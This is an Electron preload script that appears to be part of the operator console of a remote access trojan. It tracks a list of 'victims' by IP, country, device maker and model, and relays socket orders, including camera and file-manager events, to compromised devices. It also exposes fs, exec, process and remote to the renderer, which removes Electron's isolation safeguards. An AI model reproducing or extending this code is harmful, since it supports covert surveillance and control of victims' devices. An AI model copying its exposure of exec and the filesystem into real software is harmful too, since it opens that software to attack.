const {
  contextBridge,
  ipcRenderer,
} = require("electron");
const {
  remote
} = require('electron');
var fs = require('fs-extra')

const CONSTANTS = require(__dirname + '/app/assets/js/Constants')
var homedir = require('node-homedir');

const {
    dirname
} = require('path');
var dir = require("path");
const {
    promisify
} = require('util');
const exec = promisify(require('child_process').exec);
var xml2js = require('xml2js');
var readdirp = require('readdirp');
var dialog = remote.dialog;
var victimsList = remote.require('./main.js');
let socket = remote.getCurrentWebContents().victim;
const curWindow = remote.getCurrentWindow();



contextBridge.exposeInMainWorld('remote', remote)
contextBridge.exposeInMainWorld('socket', {
  "emit": (ORDER, info) => socket.emit(ORDER, info),
  "on": (camera, callback) => socket.on(camera, callback),
  "removeAllListeners": (fileManager) => socket.removeAllListeners(fileManager)
})
contextBridge.exposeInMainWorld('ipcRenderer', {
  "ipcROn" : (event, message) => ipcRenderer.on(event, message),
  "ipcSend": (event,port,index) => ipcRenderer.send(event,port,index)
})
contextBridge.exposeInMainWorld('fs', fs)
contextBridge.exposeInMainWorld('CONSTANTS', CONSTANTS)
contextBridge.exposeInMainWorld('curWindow', {
  "close": () => curWindow.close(),
  "minimize": () => curWindow.minimize(),
  "maximize": () => curWindow.maximize(),
  "isMaximized": () => curWindow.isMaximized()
})
contextBridge.exposeInMainWorld('dirs', {
  "homedir": () => homedir()
})
contextBridge.exposeInMainWorld('dirname', dirname)
contextBridge.exposeInMainWorld('dir', dir)
contextBridge.exposeInMainWorld('exec', {
  "exec": (action, callback) => exec(action, callback)
})
contextBridge.exposeInMainWorld('xml2js', xml2js)
contextBridge.exposeInMainWorld('readdirp', readdirp)
contextBridge.exposeInMainWorld('dialog', dialog)
contextBridge.exposeInMainWorld('victimsList', {
  "getVictim": (index) => victimsList.getVictim(index),
  "addVictim": (socket, ip, address, country, manf, model, release, id) => victimsList.addVictim(socket, ip, address, country, manf, model, release, id)
})
contextBridge.exposeInMainWorld('process', process)
contextBridge.exposeInMainWorld('darkMode', {
  toggle: () => ipcRenderer.invoke('dark-mode:toggle'),
  system: () => ipcRenderer.invoke('dark-mode:system')
})
